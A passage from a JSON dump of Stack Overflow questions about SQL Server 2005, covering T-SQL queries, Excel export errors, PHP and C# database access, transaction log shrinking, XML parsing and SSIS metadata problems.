function:</p>\n\n<pre><code>SELECT *\nFROM vwuser AS a\nCROSS APPLY fnuserrank(a.userid)\n</code></pre>\n\n<p>For each userID it generates multiple records. I only want the last record for each empid that does not have a Rank of Term(inated).  How can I do this?</p>\n\n<p>Data:</p>\n\n<pre>\nHistoryID empid  Rank  MonitorDate\n1          A1     E1    2012-8-9\n2          A1     E2    2012-9-12 \n3          A1     Term  2012-10-13\n4          A2     E3     2011-10-09\n5          A2     TERM   2012-11-9 \n</pre>\n\n<p>From this 2nd record and 4th record must be selected.</p>\n"},{"tags":["sql-server-2005","null","case"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":6469201,"title":"SQL Server 2005 Selecting last know good data","body":"<p>I have a situation where we collect capacity information in a table, but sometimes are data collections fail and no data is present for that day. I am trying to devise a way to check when a day is NULL, and then go back and get the <code>MAX(Date)</code> with good data. I know I am not providing a lot of information, but I have an idea to do it with a CASE statement, but I wanted to see if there were other ideas that I might not have thought of.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12984088,"title":"sql - max from group flag setter","body":"<p>I m trying to achieve flag setting for the condition in my table below</p>\n\n<pre><code>p_id      mon_year      e_id     flag  \n----      ---------     -----    -----\n 1          2011/11       20       0\n 1          2011/11       21       1\n 1          2012/01       22       1\n 1          2012/02       23       0\n 1          2012/02       24       0\n 1          2012/02       25       1\n 2          2011/11       28       0\n 2          2011/11       29       1\n 2          2012/01       30       1\n</code></pre>\n\n<p>grouping by p_id,e_id and mon_year, the flag is set for the last value in the month.</p>\n\n<p>I m confused how can i achieve this</p>\n\n<p>I tried to achieved this by using row_number and partition to seperate out the value. By still looking for to achieved</p>\n\n<p>Output by using row_number query , i have got is as below:</p>\n\n<p>Grouping by </p>\n\n<pre><code>p_id      mon_year      e_id     row\n----      ---------     -----    -----\n 1          2011/11       20       1\n 1          2011/11       21       2\n 1          2012/01       22       1\n 1          2012/02       23       1\n 1          2012/02       24       2\n 1          2012/02       25       3\n 2          2011/11       28       1\n 2          2011/11       29       2\n 2          2012/01       30       1\n</code></pre>\n\n<p>Max of this value would set the flag column. But i m really bugged how to achieve it. Any help would be useful.</p>\n\n<p>Thanks !!</p>\n"},{"tags":["php","sql-server-2005","sql-server-2008"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":927,"score":3,"question_id":1471723,"title":"PHP - SQL Server 2005 express to 2008 standard problem","body":"<p>I have a PHP app running happily on the following system:</p>\n\n<ul>\n<li>web app: PHP version 5.2.3 </li>\n<li>OS: Windows Server 2003 Standard 32 bit </li>\n<li>database: SQL Server 2005 (express)</li>\n<li>web server: IIS 6</li>\n</ul>\n\n<p>I'm trying to get the same thing running on the following:</p>\n\n<ul>\n<li>web app: PHP version 5.2.11</li>\n<li>OS: Windows Server 2008 Standard 64 bit</li>\n<li>database: SQL Server 2008 Standard 64-bit</li>\n<li>web server: IIS 7</li>\n</ul>\n\n<p>After doing the install and setup I usually do, phpinfo() is running but there is no MSSQL section. I've looked around and found some MS documentation to set up the system using a <code>php_sqlsrv.dll</code> and tried that but it seems to use a different interface to connect to the database (no more <code>mssql_connect()</code>, now it's <code>sqlsrv_connect()</code>). Is this the only way to connect php to SQL Server 2008 or do I just have the setup wrong? If I can go back to PHP 5.2.3 and have it work, that will be fine but I didn't want to undo what I have if it won't help.</p>\n\n<p>Thanks,</p>\n"},{"tags":["c#","file","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":40,"score":-3,"question_id":12996371,"title":"How to add a file to a table in MS SQL Server","body":"<p>As the title, Now I have a table to save data, type of data is file. But I don't know how to do that.\nWho can help me ?</p>\n\n<p>I'm using C# (VS 2010, MS SQL Express 2005).</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","export-to-excel","openrowset"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1139,"score":0,"question_id":9640523,"title":"SQL Server 2005 into Excel with OPENROWSET MSG 7399/7303","body":"<p>My patience is at an end with this issue. I run jobs via SSMS or the agent that have been working perfectly fine up until last week that insert data from tables/views into various Excel files.</p>\n\n<p>Most recently, the jobs/code just keep running while never finishing...these jobs use to only take up-to 15-25 seconds to complete but now never end. I've tested the code below on a new sheet and it goes instantaneously! The error I'm getting also doesn't help, the solutions I've found in Google were no help or were already set.</p>\n\n<p>Any ideas what would cause a openrowset export to just bomb out and not do its job?</p>\n\n<p>Code I generally run that works:</p>\n\n<pre><code>INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0',\n'Excel 12.0;HDR=YES;Database=C:\\Automation\\DYNAMIC\\Output\\File.xlsx;',\n'SELECT * FROM [Data$]')\n\nSELECT *\nFROM [REPORTING].[dbo].[tbl_table]\n</code></pre>\n\n<p>The current error message:</p>\n\n<blockquote>\n  <p>Msg 7399, Level 16, State 1, Line 1<br>\n  The OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"(null)\" reported an error. The provider did not give any information\n  about the error.<br>\n  Msg 7303, Level 16, State 1, Line 1<br>\n  Cannot initialize the data source object of OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"(null)\".</p>\n</blockquote>\n\n<p>System:</p>\n\n<ul>\n<li>SQL Server 2005 32-Bit on Windows XP 32-Bit</li>\n</ul>\n\n<p>Updated/Edited information:</p>\n\n<ul>\n<li><p>Excel sheets contain either functions on a separate tab or Charts extrapolating the data from the [Data$] tab (if any of this helps)</p></li>\n<li><p>I have created a brand new worksheet and tested my insert query and it worked perfectly</p></li>\n<li><p>The source file was not originally created on the server, but instead transferred via Share Drive (I don't think this would matter though)</p></li>\n</ul>\n\n<p>Any help is appreciated!!</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":0,"question_id":12994735,"title":"add series (row?) number to end of existing column data","body":"<p>I have a large table with a column that contains the same string data \"Dummy\".\nI need to add a sequential count to the end of that string to make it unique.  IE:</p>\n\n<pre><code>Dummy1\nDummy2\nDummy3 \n</code></pre>\n\n<p>For the life of me I cannot get this right.  I do not want a new column, and I do not want a new table.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":286,"score":2,"question_id":3343756,"title":"UPDATE column from another column two tables away","body":"<p>Not that good with SQL yet but I'm learning.</p>\n\n<p>So I have 3 tables:</p>\n\n<p>tblOne(Id, Type)\ntblTemp1(Name, Type)\ntblTemp2(Id, Name)</p>\n\n<p>Basically, I want to update tblOne where the where it's 'Id' matches from tblTemp2, but than that also goes and grabs its 'Type' from tblTemp1 where the 'Name' matches.</p>\n\n<p>Can anyone help?</p>\n"},{"tags":["php","sql-server","sql-server-2005","sql-server-2005-express"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":170,"score":0,"question_id":8228494,"title":"windows 7, php 5.3, when fetching binary data with sqlsrv from mssql the data is doubled","body":"<p>ok, so I have images on a MSSQL 2005 (express) server which I want to write to files.\nwith the same piece of code, on linux it works fine, on windows it writes the data twice in the file</p>\n\n<pre><code>file_put_contents($file, $val);\n$val = basename($file);\n</code></pre>\n\n<p>I know it is not a file_put_contents() problem because I also tried with fwrite\nthe output file in windows has double the size it has in linux</p>\n\n<pre><code>-rw-rw-r-- 1 dimitris dimitris  891768 2011-11-22 16:13 eshop_products__2201.jpg\n-rw-rw-r-- 1 dimitris dimitris  445884 2011-11-21 19:15 eshop_products__2201_linux.jpg\n</code></pre>\n\n<p>I am using the freetds driver for linux and php_pdo_sqlsrv_53_nts_vc9 in windows</p>\n\n<p>any ideas on something I could do to get the correct data in windows? maybe some configuration I missed?</p>\n\n<p>topmost bytes of each file:</p>\n\n<p>windows file:</p>\n\n<pre><code>ASCII (php substr):\nFFD8FFE000104A46494600010100000100010000FFDB0043000302020302020303030304030304050805050404050A070706080C0...etc...\n\nhex:\n00000000:  46 46 44 38 46 46 45 30  30 30 31 30 34 41 34 36  FFD8FFE000104A46\n00000010:  34 39 34 36 30 30 30 31  30 31 30 30 30 30 30 31  4946000101000001\n00000020:  30 30 30 31 30 30 30 30  46 46 44 42 30 30 34 33  00010000FFDB0043\n00000030:  30 30 30 33 30 32 30 32  30 33 30 32 30 32 30 33  0003020203020203\n00000040:  30 33 30 33 30 33 30 34  30 33 30 33 30 34 30 35  0303030403030405\n00000050:  30 38 30 35 30 35 30 34  30 34 30 35 30 41 30 37  0805050404050A07\n00000060:  30 37 30 36 30 38 30 43  30 41 30 43 30 43 30 42  0706080C0A0C0C0B\n</code></pre>\n\n<p>linux file:</p>\n\n<pre><code>ASCII (php substr):\nJFIFC\n\nhex:\n00000000:  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  ......JFIF......\n00000010:  00 01 00 00 ff db 00 43  00 03 02 02 03 02 02 03  .......C........\n00000020:  03 03 03 04 03 03 04 05  08 05 05 04 04 05 0a 07  ................\n00000030:  07 06 08 0c 0a 0c 0c 0b  0a 0b 0b 0d 0e 12 10 0d  ................\n00000040:  0e 11 0e 0b 0b 10 16 10  11 13 14 15 15 15 0c 0f  ................\n00000050:  17 18 16 14 18 12 14 15  14 ff db 00 43 01 03 04  ............C...\n00000060:  04 05 04 05 09 05 05 09  14 0d 0b 0d 14 14 14 14  ................\n00000070:  14 14 14 14 14 14 14 14  14 14 14 14 14 14 14 14  ................\n</code></pre>\n\n<p>The code extracting the file from the database is base on the yii framework, using yii's commands feature (php cli)</p>\n\n<p>Connection strings:</p>\n\n<p>linux</p>\n\n<pre><code>'connectionString' =&gt; 'dblib:host=192.168.56.101;port=1433;dbname=mssqldb',\n</code></pre>\n\n<p>windows</p>\n\n<pre><code>'connectionString' =&gt; 'sqlsrv:Server=192.168.56.101;Database=mssqldb',\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>$rows = $this-&gt;db-&gt;createCommand(\"SELECT * FROM $viewName WHERE 1=1\")-&gt;queryAll();\n\n/*\n * Convert charset and extract photos from view\n */\nforeach ($rows as $row) {\n    // convert charset / export photos\n    foreach ($row as $key =&gt; &amp;$val) {\n        // charset conversion, on fields that do not contain photos\n        // $viewCfg is an array I maintain to know which field does what\n        if (empty($viewCfg['photos']) || !in_array($key, $viewCfg['photos'])) {\n            $val = @iconv(\"Windows-1253\", \"UTF-8\", $val);\n        // grab image in file\n        } else {\n            $id = '';\n            foreach ($viewCfg['keys'] as $fieldName) {\n                $id .= '_' . $row[$fieldName];\n            }\n\n            $file = Yii::app()-&gt;params['pathPhotos'] . '/' . $viewName . '_' . $id . '.jpg';\n\n            if ($val) {\n                if (file_exists($file) &amp;&amp; (file_get_contents($file)!=$val))\n                    unlink($file);\n\n                file_put_contents($file, $val);\n                $val = basename($file);\n            }\n        }\n    }\n// ... do the rest\n</code></pre>\n"},{"tags":["sql","sql-server-2005","select"],"answer_count":8,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1883,"score":0,"question_id":5340064,"title":"Select 2 columns in one","body":"<p>Is it possible to select 2 columns in just one?</p>\n\n<p>Example: </p>\n\n<p>select something + somethingElse as onlyOneColumn from someTable</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008"],"answer_count":3,"favorite_count":6,"up_vote_count":6,"down_vote_count":0,"view_count":2865,"score":6,"question_id":793643,"title":"Auditing SQL Server data changes","body":"<p>I'm looking at changing our Auditing process for our SQL Server 2005 databases and I came across Change Data Capture in SQL Server 2008. </p>\n\n<p>This looks like a good idea, and I'm tempted to try it, but before I do has anyone used it in a commercial environment and what are your thoughts?</p>\n\n<p>I noticed when I was reading about CDC in the MS help, it said that audit data would usually be kept for a couple of days. That's not possible here, I'd like to keep the data indefinitely, does anyone know of problems with this approach?</p>\n\n<p>If this isn't a good solution for reasons I'm unaware of, have you any other solutions for  auditing of data changes. I'm keen to use a system that can be implemented across the board on any tables I desire.</p>\n\n<p>I'm after the basic: \"Before, After, Who By, When\" information for any changes.</p>\n"},{"tags":["sql-server","database","sql-server-2005","mirroring","transaction-log"],"answer_count":10,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":6820,"score":0,"question_id":1033158,"title":"Shrinking the transaction log of a mirrored SQL Server 2005 database","body":"<p>I've been looking all over the internet and I can't find an acceptable solution to my problem, I'm wondering if there even is a solution without a compromise...</p>\n\n<p>I'm not a DBA, but I'm a one man team working on a huge web site with no extra funding for extra bodies, so I'm doing the best I can.</p>\n\n<p>Our backup plan sucks, and I'm having a really hard time improving it.  Currently, there are two servers running SQL Server 2005.  I have a mirrored database (no witness) that seems to be working well.  I do a full backup at noon and at midnight.  These get backed up to tape by our service provider nightly, and I burn the backup files to dvd weekly to keep old records on hand.  Eventually I'd like to switch to log shipping, since mirroring seems kinda pointless without a witness server.</p>\n\n<p>The issue is that the transaction log is growing non-stop.  From the research I've done, it seems that I can't truncate a log file of a mirrored database.  So how do I stop the file from growing!?</p>\n\n<p>Based on <a href=\"http://www.sqlservercentral.com/Forums/Topic377087-146-1.aspx\" rel=\"nofollow\">this web page</a>, I tried this:</p>\n\n<pre><code>USE dbname\nGO\nCHECKPOINT\nGO\nBACKUP LOG dbname TO DISK='NULL' WITH NOFORMAT, INIT, NAME = N'dbnameLog Backup', SKIP, NOREWIND, NOUNLOAD\nGO\nDBCC SHRINKFILE('dbname_Log', 2048)\nGO\n</code></pre>\n\n<p>But that didn't work.  Everything else I've found says I need to disable the mirror before running the backup log command in order for it to work.</p>\n\n<h2>My Question (TL;DR)</h2>\n\n<p>How can I shrink my transaction log file without disabling the mirror?</p>\n"},{"tags":["sql","sql-server-2005","tsql","bulkinsert"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":871,"score":1,"question_id":4436021,"title":"Additional characters are coming during bulk insert","body":"<p>I am trying to bulk insert the first row from a csv file into a table with only one column.\nBut I am getting some extra characters('n++') in the begining like this:</p>\n\n<pre><code>n++First Column;Second Column;Third Column;Fourth Column;Fifth Columnm;Sixth Column\n</code></pre>\n\n<p>CSV file contents are like:</p>\n\n<pre><code>First Column;Second Column;Third Column;Fourth Column;Fifth Columnm;Sixth Column\n</code></pre>\n\n<p>You can find the test.csv file <a href=\"http://www.filefactory.com/file/b4ah0h3/n/test.csv/\" rel=\"nofollow\" title=\"here\">here</a></p>\n\n<p>And this is the code I am using to get the first row data in a table</p>\n\n<pre><code>declare @importSQL nvarchar(2000)\ndeclare @tempstr varchar(max)\ndeclare @path varchar(100)  \n\nSET @path = 'D:\\test.csv'    \n\nCREATE TABLE #tbl (line VARCHAR(max))\n\nSET @importSQL = \n'BULK INSERT #tbl \nFROM ''' + @path + ''' \nWITH ( \nLASTROW = 1,\nFIELDTERMINATOR = ''\\n'',\nROWTERMINATOR = ''\\n''\n)' \n\nEXEC sp_executesql @stmt=@importSQL \n\nSET @tempstr = (SELECT TOP 1 RTRIM(REPLACE(Line, CHAR(9), ';')) FROM #tbl)\n\nprint @tempstr\ndrop table #tbl\n</code></pre>\n\n<p>Any idea where this extra 'n++' is coming from?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":12942301,"title":"Windows Authentication to Sql Server Authentication","body":"<p>I have an existing SQL Server 2005, currently I am using in Windows Authentication and Db name is Restaurant.\nI know how to change existing SQL Server from Windows Auth to SQL Server Auth, but it doesnt locks the DB.\nIs there any way I can change my current SQL Server to SQL Server Authentication so as if any one tries to open Restaurant(DB) it'l ask for authentication.\nAnd also please tell me what needs to be connection string.</p>\n\n<p>Thanks</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12986281,"title":"how to change database version from 655 to 612?","body":"<p>Error -</p>\n\n<blockquote>\n  <p><em>mdf file can not be opened because it is version 655, this version\n  support 612 or earlier</em></p>\n</blockquote>\n\n<p>Note :</p>\n\n<p>I am created this database file using SQL Server 2005 and later that file is opened in SQL Server 2008 then automatically change version from 612 to 655.</p>\n\n<p>But I currently want to open that file in SQL Server 2005.</p>\n\n<p>Any solution is possible then help me.</p>\n"},{"tags":[".net","sql-server-2005","c#-4.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12986216,"title":"String gets truncated when inserted in database in c#?","body":"<p>I am new to .net (Visual Studio .net 2010) trying to insert a string in database SQL Server 2005 with column datatype <code>varchar(max)</code>, it truncates the string I insert. </p>\n\n<p>I have tested insertion in query builder and string was not truncated there. Kindly help code pasted below</p>\n\n<pre><code>DirectoryInfo dir = new DirectoryInfo(MapPath(ResID_int));\n\nFileInfo[] file = dir.GetFiles();\nArrayList list = new ArrayList();\n\n//   int i = 0;\nforeach (FileInfo file2 in file)\n{\n   name = \"/Albums/\" + id+ \"/\"+ file2.Name;\n   Response.Write(name);\n   DataSet2TableAdapters.Picture1TableAdapter insert = new Picture1TableAdapter();\n   insert.InsertData(name, id);\n}\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","like-keyword"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":23635,"score":3,"question_id":4855754,"title":"How to use like condition with multiple values in sql server 2005?","body":"<p>I need to filter out records based on some text matching in nvarchar(1000) column.\nTable has more than 400 thousands records and growing. For now, I am using Like condition:-</p>\n\n<pre><code>SELECT \n    *\nFROM\n    table_01\nWHERE\n    Text like '%A1%'\n    OR Text like '%B1%'\n    OR Text like '%C1%'\n    OR Text like '%D1%'\n</code></pre>\n\n<p>Is there any preferred work around? </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":12461,"score":3,"question_id":2419451,"title":"SQL Server 2005 Convert VARCHAR to INT but default on invalid type","body":"<p>I have a varchar(100) column in a table that contains a mix of integers (as strings) and non-integer strings. E.g.</p>\n\n<pre><code>| dimension varchar(100) |\n| '5'                    |\n| '17'                   |\n| '3'                    |\n| 'Pyramids'             |\n| 'Western Bypass'       |\n| '15'                   |\n</code></pre>\n\n<p>How can I write an expression to, e.g. sum up all the values that are valid integers? If I were to try:</p>\n\n<pre><code>-- should return 5 + 17 + 3 + 15 = 40\nSELECT\n    SUM( CONVERT( INT, dimension ) )\nFROM\n    mytable\n</code></pre>\n\n<p>I would receive a <code>Conversion failed when converting the varchar value 'Pyramids' to data type int.</code> error.</p>\n\n<p>Is there a test I can use in my expression, much like the <code>ISNULL()</code> function, that permits me to specify a default value if the field is not a number?</p>\n"},{"tags":["sql","sql-server-2005","tsql","duplicate-removal"],"answer_count":13,"favorite_count":8,"up_vote_count":9,"down_vote_count":0,"view_count":25043,"score":9,"question_id":985384,"title":"Delete duplicate records from a SQL table without a primary key","body":"<p>I have the below table with the below records in it</p>\n\n<pre><code>create table employee\n(\n EmpId number,\n EmpName varchar2(10),\n EmpSSN varchar2(11)\n);\n\ninsert into employee values(1, 'Jack', '555-55-5555');\ninsert into employee values (2, 'Joe', '555-56-5555');\ninsert into employee values (3, 'Fred', '555-57-5555');\ninsert into employee values (4, 'Mike', '555-58-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6, 'Lisa', '555-70-5555');\ninsert into employee values (1, 'Jack', '555-55-5555');\ninsert into employee values (4, 'Mike', '555-58-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6 ,'Lisa', '555-70-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6, 'Lisa', '555-70-5555');\n</code></pre>\n\n<p>I dont have any primary key in this table .But i have the above records in my table already.\nI want to remove the duplicate records which has the same value in EmpId and EmpSSN fields.</p>\n\n<p>Ex : Emp id 5 </p>\n\n<p>Can any one help me to frame a query to delete those duplicate records</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":5,"up_vote_count":8,"down_vote_count":0,"view_count":13459,"score":8,"question_id":868620,"title":"SQL Script to alter ALL Foreign Keys to add ON DELETE CASCADE","body":"<p>I have a SQL 2005 database with approx 250 tables.</p>\n\n<p>I want to temporarily enable ON DELETE CASCADE to all of the Foreign Keys so that I can do a bulk delete easily.</p>\n\n<p>I then want to turn off ON DELETE CASCADE on all Foreign Keys.</p>\n\n<p>The only way I know of doing this, is to use Management Studio to generate a full database create script, do some kind of search and replace to strip out everything but Foreign Keys, save the script, then do some more search and replacing to add the ON DELETE CASCADE.</p>\n\n<p>Then I run the script, do my delete, and then run the other script.</p>\n\n<p>Is there an easier way to produce this script? This method seems far too prone to error and I will have to keep the script up to date with any other changes we make to the database, or re-generate it manually each time I may need to use it.</p>\n\n<p>Is an alternative option to run a select on the system tables to \"generate\" the script for me? Could it even be possible to run an update on a system table that enables and disables ON DELETE CASCADE?</p>\n"},{"tags":["sql","xml","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12983250,"title":"Parsing/Processing XML and Inserting Into SQL Tables","body":"<p>Following up from: <a href=\"http://stackoverflow.com/questions/12979693/is-this-xml-format-correct\">Is this XML format correct?</a></p>\n\n<p>I've got some SQL code working that loops through the QABLOCKs and prints them (the PRINTs will change to INSERTs in production).</p>\n\n<pre><code>-- XML instance\nDECLARE    @x1 XML\nSELECT @x1 = \n'\n&lt;tests&gt;\n    &lt;test id=\"1\"&gt;\n        &lt;qablock number=\"1\"&gt;\n            &lt;question&gt;What is 1 + 1?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 2.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"1\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"0\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n        &lt;qablock number=\"2\"&gt;\n            &lt;question&gt;What is 2 + 2?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 4.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"0\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"1\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n    &lt;/test&gt;\n&lt;/tests&gt;\n'\n\nDECLARE \n    @cnt INT, \n    @totCnt INT,\n    @child XML\n\n-- counter variables\nSELECT \n    @cnt = 1,\n    @totCnt = @x1.value('count(/tests/test/qablock)','INT')\n\n-- loop\nWHILE @cnt &lt;= @totCnt BEGIN\n    SELECT\n        1 AS tests_id, --this is hard-coded\n        @cnt AS qablock_number, \n        @x1.value('(/tests/test/qablock[position()=sql:variable(\"@cnt\")]/question/text())[1]','varchar(500)') AS question, \n        @x1.value('(/tests/test/qablock[position()=sql:variable(\"@cnt\")]/explanation/text())[1]','varchar(1000)') AS explanation\n\n    PRINT 'Processing Child Element: ' + CAST(@cnt AS VARCHAR)\n    PRINT 'Child element:  ' + CAST(@child AS VARCHAR(max))\n    PRINT ''\n\n    -- increment the counter variable\n    SELECT @cnt = @cnt + 1\nEND\n</code></pre>\n\n<p>I don't know if that's the correct procedure whatsoever, but at least it seems to work. What I'd like to do next is run another similar script that loops through all the OPTIONs and PRINTs them as well. For each OPTION, I need to print: QABLOCK number, OPTION number, OPTION value, and OPTION is_correct. I can't even get close. :( Here's what I've got so far:</p>\n\n<pre><code>-- XML instance\nDECLARE    @x1 XML\nSELECT @x1 = \n'\n&lt;tests&gt;\n    &lt;test id=\"1\"&gt;\n        &lt;qablock number=\"1\"&gt;\n            &lt;question&gt;What is 1 + 1?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 2.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"1\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"0\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n        &lt;qablock number=\"2\"&gt;\n            &lt;question&gt;What is 2 + 2?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 4.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"0\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"1\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n    &lt;/test&gt;\n&lt;/tests&gt;\n'\n\nDECLARE \n    @cnt INT, \n    @totCnt INT,\n    @child XML\n\n-- counter variables\nSELECT \n    @cnt = 1,\n    @totCnt = @x1.value('count(/tests/test/qablock/options/option)','INT')\n\n-- loop\nWHILE @cnt &lt;= @totCnt BEGIN\n    SELECT\n        1 AS tests_id, --hard-coded value\n        @x1.value('(/tests/test/qablock/@number)[1]','varchar(500)') AS qablock_number, \n        @x1.value('(/tests/test/qablock/options/option[position()=sql:variable(\"@cnt\")]/@number)[1]','varchar(500)') AS option_number\n\n    PRINT 'Processing Child Element: ' + CAST(@cnt AS VARCHAR)\n    PRINT 'Child element:  ' + CAST(@child AS VARCHAR(max))\n    PRINT ''\n\n    -- increment the counter variable\n    SELECT @cnt = @cnt + 1\nEND\n</code></pre>\n\n<p>So, obviously it's messed up, but I can't seem to figure out what to change. </p>\n\n<p>First of all, I don't know how to get the parent QABLOCK number of the current OPTION. </p>\n\n<p>Second, only my first 5 option_number's are displaying their numbers properly, the second 5 are showing NULL. </p>\n\n<p>P.S. Some of this code was from:\n<a href=\"http://beyondrelational.com/modules/2/blogs/28/posts/10316/xquery-lab-35-how-to-write-a-loop-to-process-all-the-child-elements-of-an-xml-value.aspx\" rel=\"nofollow\">http://beyondrelational.com/modules/2/blogs/28/posts/10316/xquery-lab-35-how-to-write-a-loop-to-process-all-the-child-elements-of-an-xml-value.aspx</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":896,"score":2,"question_id":7475845,"title":"Getting Number of weeks in a Month from a Datetime Column","body":"<p>I have a table called FcData and the data looks like:</p>\n\n<pre><code>Op_Date\n\n2011-02-14 11:53:40.000\n2011-02-17 16:02:19.000\n2010-02-14 12:53:40.000\n2010-02-17 14:02:19.000\n</code></pre>\n\n<p>I am looking to get the Number of weeks in That Month from Op_Date. So I am looking for output like:</p>\n\n<pre><code> Op_Date                       Number of Weeks\n\n    2011-02-14 11:53:40.000       5   \n    2011-02-17 16:02:19.000       5\n    2010-02-14 12:53:40.000       5\n    2010-02-17 14:02:19.000       5\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":217,"score":0,"question_id":7711336,"title":"SQL Server Rounding Issue","body":"<p>I'm using SQL Server 2005. And I'm using ROUND T-SQL function to round a decimal column value. But it seems that the rounded value is incorrect.</p>\n\n<pre><code>    PRINT ROUND(1890.124854, 2) =&gt; 1890.120000\n</code></pre>\n\n<p>As shown the ROUND function is returning 1890.12 where as it should be 1890.13. Does anyone encountered this and what should be the correct way of rounding so that I get the expected value 1890.13..?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3712,"score":0,"question_id":687727,"title":"SSIS external metadata column needs to be removed","body":"<p>I am creating a select statement on the fly because the column names and table name can change, but they all need to go into the same data destination. There are other commonalities that make this viable, if I need to later I will go into them. So, what it comes down to is this: I am creating the select statement with 16 columns, there will always be sixteen columns, no more, no less, the column names can change and the table name can change. When I execute the package the select statement gets built just fine but when the Data Flow tries to execute, I get the following error:</p>\n\n<p>The \"external metadata column \"ColumnName\" (79)\" needs to be removed from the external metadata column collection.</p>\n\n<p>The actual SQL Statement being generated is:</p>\n\n<p>select 0 as ColumnName, Column88 as CN1, 0 as CN2, 0 as CN3, 0 as CN4, 0 as CN5, 0 as CN6, 0 as CN7, 0 as CN8, 0 as CN9, 0 as CN10, 0 as CN11, 0 as CN12, 0 as CN13, 0 as CN14, 0 as CN15 from Table3</p>\n\n<p>The column 'Column88' is generated dynamicly and so is the table name. If source columns exist for the other ' as CNx' columns, they will appear the same way (Column88 as CN1, Column89 as CN2, Column90 as CN3, etc.) and the table name will always be in the form: Tablex where x is an integer.</p>\n\n<p>Could anyone please help me out with what is wrong and how to fix it?</p>\n\n<p>Thank 